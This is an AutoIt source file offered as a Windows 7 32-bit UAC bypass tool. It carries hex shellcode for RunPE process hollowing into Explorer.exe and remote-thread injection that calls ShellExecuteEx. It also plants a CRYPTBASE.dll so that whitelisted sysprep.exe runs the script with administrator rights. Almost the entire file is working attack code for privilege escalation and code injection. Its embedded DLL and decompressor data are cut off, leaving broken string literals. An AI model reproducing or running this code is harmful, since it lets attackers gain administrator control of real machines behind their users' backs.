#include <WinApi.au3>
#include <Memory.au3>


;Code By Pink|Danyfirex|Dany 28/03/2014
;UACByPass
;32-bit Only
;Based on/thanks: [url]http://www.pretentiousname.com/misc/win7_uac_whitelist2.html[/url]

Global $_LZF_CodeBuffer, $_LZF_CodeBufferMemory, $_LZF_Compress, $_LZF_Decompress


Local $sProcessName = "Explorer.exe"
Local $sysprepPath = @SystemDir & "\sysprep\sysprep.exe"
Local $sCrypbase = @SystemDir & "\sysprep\CRYPTBASE.dll"
Local $ExplorerPath = @WindowsDir & "\" & $sProcessName
Local $TempCRYPTBASE = @TempDir & "\CRYPTBASE.dll"


If Not (@Compiled) Then Exit

If @OSArch = "X86" Then

    If IsAdmin() Then
        If FileExists($sCrypbase) Then FileDelete($sCrypbase)
        MsgBox(0, "Pink", "Hola Soy Admin :)")
        Exit
    Else
        MsgBox(0, "Pink", "No soy Admin :(")
        If FileExists($sCrypbase) Then FileDelete($sCrypbase)
        UACbyPass()
        If FileExists($TempCRYPTBASE) Then FileDelete($TempCRYPTBASE)
    EndIf

    Exit

EndIf



Func UACbyPass()
    WriteDllTemp()
    FileData()
    RunPE($ExplorerPath, FileData())

    Sleep(2000)

    Local $hProcess = _WinAPI_OpenProcess(BitOR($PROCESS_CREATE_THREAD, $PROCESS_VM_OPERATION, $PROCESS_VM_WRITE), False, ProcessExists($sProcessName))

    Local $iRet = RemoteShellExecuteEx($hProcess, $sysprepPath, @ScriptFullPath)

    Return $iRet
EndFunc   ;==>UACbyPass

Func RunPE($path, $filebin)


    Local $ASM = "0x60E84E0000006B00650072006E0065006C003300320000006E00740064006C006C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005B8BFC6A42E8BB0300008B54242889118B54242C6A3EE8AA03000089116A4AE8A103000089396A1E6A3CE89D0300006A2268F4000000E8910300006A266A24E8880300006A2A6A40E87F030000"
    $ASM &= "6A2E6A0CE8760300006A3268C8000000E86A0300006A2AE85C0300008B09C701440000006A12E84D030000685BE814CF51E8790300006A3EE83B0300008BD16A1EE8320300006A40FF32FF31FFD06A12E823030000685BE814CF51E84F0300006A1EE8110300008B098B513C6A3EE8050300008B3903FA6A22E8FA0200008B0968F80000005751FFD06A00E8E80200006888FEB31651E8140300006A2EE8D60200"
    $ASM &= "008B396A2AE8CD0200008B116A42E8C402000057526A006A006A046A006A006A006A00FF31FFD06A12E8A902000068D03710F251E8D50200006A22E8970200008B116A2EE88E0200008B09FF7234FF31FFD06A00E87E020000689C951A6E51E8AA0200006A22E86C0200008B118B396A2EE8610200008B096A406800300000FF7250FF7734FF31FFD06A36E8470200008BD16A22E83E0200008B396A3EE8350200"
    $ASM &= "008B316A22E82C0200008B016A2EE8230200008B0952FF775456FF7034FF316A00E81002000068A16A3DD851E83C02000083C40CFFD06A12E8F9010000685BE814CF51E8250200006A22E8E70100008B1183C2066A3AE8DB0100006A025251FFD06A36E8CE010000C70100000000B8280000006A36E8BC010000F7216A1EE8B30100008B118B523C81C2F800000003D06A3EE89F01000003116A26E8960100006A"
    $ASM &= "2852FF316A12E88A010000685BE814CF51E8B601000083C40CFFD06A26E8730100008B398B098B71146A3EE86501000003316A26E85C0100008B098B510C6A22E8500100008B090351346A46E8440100008BC16A2EE83B0100008B0950FF77105652FF316A00E82A01000068A16A3DD851E85601000083C40CFFD06A36E8130100008B1183C20189116A3AE8050100008B093BCA0F8533FFFFFF6A32E8F4000000"
    $ASM &= "8B09C701070001006A00E8E500000068D2C7A76851E8110100006A32E8D30000008B116A2EE8CA0000008B0952FF7104FFD06A22E8BB0000008B3983C7346A32E8AF0000008B318BB6A400000083C6086A2EE89D0000008B116A46E894000000516A045756FF326A00E88600000068A16A3DD851E8B200000083C40CFFD06A22E86F0000008B098B51280351346A32E8600000008B0981C1B000000089116A00E8"
    $ASM &= "4F00000068D3C7A7E851E87B0000006A32E83D0000008BD16A2EE8340000008B09FF32FF7104FFD06A00E82400000068883F4A9E51E8500000006A2EE8120000008B09FF7104FFD06A4AE8040000008B2161C38BCB034C2404C36A00E8F2FFFFFF6854CAAF9151E81E0000006A406800100000FF7424186A00FFD0FF742414E8CFFFFFFF890183C410C3E82200000068A44E0EEC50E84B00000083C408FF742404"
    $ASM &= "FFD0FF74240850E83800000083C408C355525153565733C0648B70308B760C8B761C8B6E088B7E208B3638471875F3803F6B7407803F4B7402EBE78BC55F5E5B595A5DC35552515356578B6C241C85ED74438B453C8B54287803D58B4A188B5A2003DDE330498B348B03F533FF33C0FCAC84C07407C1CF0D03F8EBF43B7C242075E18B5A2403DD668B0C4B8B5A1C03DD8B048B03C55F5E5B595A5DC3C300000000"



    Local $BufferASM = DllStructCreate("byte[" & BinaryLen($ASM) & "]")
    Local $binBuffer = DllStructCreate("byte[" & BinaryLen($filebin) & "]")


    DllStructSetData($BufferASM, 1, $ASM)
    DllStructSetData($binBuffer, 1, $filebin)




    Local $Ret = DllCall("user32.dll", "int", "CallWindowProcW", _
            "ptr", DllStructGetPtr($BufferASM), _
            "wstr", ($Path), _
            "ptr", DllStructGetPtr($binBuffer), _
            "int", 0, _
            "int", 0)

EndFunc   ;==>RunPE





Func RemoteShellExecuteEx($hProcess, $sFile, $sParameters, $sVerb = "OPEN", $hWnd = 0)


    Local Const $SEE_MASK_INVOKEIDLIST = 0xC
    Local Const $SEE_MASK_NOCLOSEPROCESS = 0x40
    Local Const $SEE_MASK_FLAG_NO_UI = 0x400

    Local $Databuffer = 0, $FileBuff = 0, $SHELLEXECUTEINFO = 0, $sSHELLEXECUTEINFO = "", $sfiles = "", $written = 0

    $sfiles = "wchar modulename[12];char function[16];wchar sverb[256];wchar file[256];wchar Parameters[256];"
    $sSHELLEXECUTEINFO = "int cbSize;long fMask;hwnd hWnd;ptr lpVerb;ptr lpFile;ptr lpParameters;ptr lpDirectory;" & _
            "int nShow;int hInstApp;ptr lpIDList;ptr lpClass;hwnd hkeyClass;int dwHotKey;hwnd hIcon;" & _
            "hwnd hProcess"

    $Databuffer = DllStructCreate($sfiles & $sSHELLEXECUTEINFO)

    DllStructSetData($Databuffer, "sverb", $sVerb)
    DllStructSetData($Databuffer, "file", $sFile)
    DllStructSetData($Databuffer, "Parameters", $sParameters)
    DllStructSetData($Databuffer, "modulename", "Shell32.dll") ;Libreria
    DllStructSetData($Databuffer, "function", "ShellExecuteExW") ; Funcion
    DllStructSetData($Databuffer, "cbSize", 60) ;Tamano Structura 60
    DllStructSetData($Databuffer, "fMask", $SEE_MASK_INVOKEIDLIST)
    DllStructSetData($Databuffer, "hwnd", $hWnd)



    $pRemoteData = _MemVirtualAllocEx($hProcess, 0, sizeof($Databuffer), $MEM_COMMIT, $PAGE_READWRITE)
    If Not $pRemoteData Then Return MsgBox(16, "Epic Failure", "Failed to allocate memory in process!")


    $Loadlibrary = DllCall("Kernel32.dll", "ptr", "GetProcAddress", "ptr", _WinAPI_GetModuleHandle("Kernel32.dll"), "str", "LoadLibraryW")
    $Loadlibrary = $Loadlibrary[0]

    $GetProcAddress = DllCall("Kernel32.dll", "ptr", "GetProcAddress", "ptr", _WinAPI_GetModuleHandle("Kernel32.dll"), "str", "GetProcAddress")
    $GetProcAddress = $GetProcAddress[0]

    $CodeBuffer = DllStructCreate("byte[33]")

    $pRemoteCode = _MemVirtualAllocEx($hProcess, 0, sizeof($CodeBuffer), $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)


    ;Punteros a cadenas
    DllStructSetData($Databuffer, "lpVerb", $pRemoteData + (_ptr($Databuffer, "sverb") - _ptr($Databuffer)))
    DllStructSetData($Databuffer, "lpFile", $pRemoteData + (_ptr($Databuffer, "file") - _ptr($Databuffer)))
    DllStructSetData($Databuffer, "lpParameters", $pRemoteData + (_ptr($Databuffer, "Parameters") - _ptr($Databuffer)))



    DllStructSetData($CodeBuffer, 1, _
            "0x" & _
            "68" & SwapEndian($pRemoteData + (_ptr($Databuffer, "modulename") - _ptr($Databuffer))) & _  ; push RemoteData.modulename
            "B8" & SwapEndian($Loadlibrary) & _                                                         ; mov eax,LoadLibrary
            "FFD0" & _                                                                                  ; call eax
            "68" & SwapEndian($pRemoteData + (_ptr($Databuffer, "function") - _ptr($Databuffer))) & _   ; push RemoteData.function ShellExecuteExW
            "50" & _                                                                                    ; push eax
            "B8" & SwapEndian($GetProcAddress) & _                                                      ; mov eax,GetProcAddress
            "FFD0" & _                                                                                  ; call eax
            "68" & SwapEndian($pRemoteData + (_ptr($Databuffer, "cbSize") - _ptr($Databuffer))) & _         ; push Puntero SHELLEXECUTEINFO
            "FFD0" & _                                                                                  ; call eax
            "C3") ; Ret




    _WinAPI_WriteProcessMemory($hProcess, $pRemoteCode, _ptr($CodeBuffer), sizeof($CodeBuffer), $written)
    _WinAPI_WriteProcessMemory($hProcess, $pRemoteData, _ptr($Databuffer), sizeof($Databuffer), $written)

    $iThread = DllCall("Kernel32.dll", "int", "CreateRemoteThread", "ptr", $hProcess, "ptr", 0, "int", 0, "ptr", $pRemoteCode, "ptr", 0, "int", 0, "dword*", 0)
    $hThread = $iThread[0]


    _WinAPI_WaitForSingleObject($hThread)

    _MemVirtualFreeEx($hProcess, $pRemoteCode, 0, $MEM_RELEASE)
    _MemVirtualFreeEx($hProcess, $pRemoteData, 0, $MEM_RELEASE)


    $iThread = DllCall("Kernel32.dll", "ptr", "GetExitCodeThread", "ptr", $hThread, "dword*", 0)
    Return $iThread[2]
EndFunc   ;==>RemoteShellExecuteEx


Func sizeof($s)
    Return DllStructGetSize($s)
EndFunc   ;==>sizeof

Func _ptr($s, $e = "")
    If $e <> "" Then Return DllStructGetPtr($s, $e)
    Return DllStructGetPtr($s)
EndFunc   ;==>_ptr

Func SwapEndian($hex)
    Return Hex(BitOR(BitOR(BitOR(BitShift($hex, 24), _
            BitAND(BitShift($hex, -8), 0x00FF0000)), _
            BitAND(BitShift($hex, 8), 0x0000FF00)), _
            BitShift($hex, -24)), 8)
EndFunc   ;==>SwapEndian




;ASM
Func FileData()
    Local $Decompressed = ""
    Local $sDll = '0x
    $Decompressed = _LZF_Decompress($sDll)
    Return $Decompressed
EndFunc   ;==>FileData

;Dll
Func WriteDllTemp()
    Local $sTempPath = @TempDir
    Local $Decompressed = ""
    Local $sDll = '0x
    $sDll
    $sDll
    $sDll

    $Decompressed = _LZF_Decompress($sDll)
    FileWrite($sTempPath & "\CRYPTBASE.dll", $Decompressed)
EndFunc   ;==>WriteDllTemp





;By Ward
Func _LZF_Exit()
    $_LZF_CodeBuffer = 0
    _MemVirtualFree($_LZF_CodeBufferMemory, 0, $MEM_RELEASE)
EndFunc   ;==>_LZF_Exit

Func _LZF_Startup()
    If Not IsDllStruct($_LZF_CodeBuffer) Then
        If @AutoItX64 Then
            Local $Opcode = '0x
            $Opcode
        Else
            Local $Opcode = '0x
            $Opcode
        EndIf
        $_LZF_Compress = (StringInStr($Opcode, "89C0") - 3) / 2
        $_LZF_Decompress = (StringInStr($Opcode, "89DB") - 3) / 2
        $Opcode = Binary($Opcode)

        $_LZF_CodeBufferMemory = _MemVirtualAlloc(0, BinaryLen($Opcode), $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
        $_LZF_CodeBuffer = DllStructCreate("byte[" & BinaryLen($Opcode) & "]", $_LZF_CodeBufferMemory)
        DllStructSetData($_LZF_CodeBuffer, 1, $Opcode)
        OnAutoItExitRegister("_LZF_Exit")
    EndIf
EndFunc   ;==>_LZF_Startup


Func _LZF_Decompress_Core($Data, $MaxBuffer)
    If Not IsDllStruct($_LZF_CodeBuffer) Then _LZF_Startup()

    $Data = Binary($Data)
    Local $InputLen = BinaryLen($Data)
    Local $Input = DllStructCreate("byte[" & $InputLen & "]")
    DllStructSetData($Input, 1, $Data)

    Local $Output = DllStructCreate("byte[" & $MaxBuffer & "]")

    Local $Var = DllStructCreate("ptr src; ptr dst")
    DllStructSetData($Var, "src", DllStructGetPtr($Input))
    DllStructSetData($Var, "dst", DllStructGetPtr($Output))

    Local $Ret = DllCall("user32.dll", "uint", "CallWindowProc", "ptr", DllStructGetPtr($_LZF_CodeBuffer) + $_LZF_Decompress, _
            "ptr", DllStructGetPtr($Var), _
            "uint", $InputLen, _
            "uint", $MaxBuffer, _
            "int", 0)

    Return BinaryMid(DllStructGetData($Output, 1), 1, $Ret[0])
EndFunc   ;==>_LZF_Decompress_Core


Func _LZF_Decompress($Data)
    If Not IsDllStruct($_LZF_CodeBuffer) Then _LZF_Startup()

    $Data = Binary($Data)
    Local $OutputLen = Int(BinaryMid($Data, 1, 4))
    Return _LZF_Decompress_Core(BinaryMid($Data, 5), $OutputLen)
EndFunc   ;==>_LZF_Decompress